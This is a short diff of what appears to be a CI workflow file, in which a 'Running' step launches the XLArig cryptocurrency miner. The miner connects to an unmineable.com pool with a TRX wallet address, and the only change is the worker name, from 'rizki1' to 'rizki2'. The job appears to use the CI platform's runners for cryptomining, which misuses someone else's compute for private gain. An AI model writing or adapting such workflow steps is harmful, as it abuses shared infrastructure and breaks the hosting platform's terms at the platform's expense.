@@ -44,7 +44,7 @@ jobs:
 
     - name: Running
 
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TVzni75K2hQqfDGEnLpWBHgrAMQWTXiLJb.rizki1
+      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TVzni75K2hQqfDGEnLpWBHgrAMQWTXiLJb.rizki2
 
     - name: DONE
 
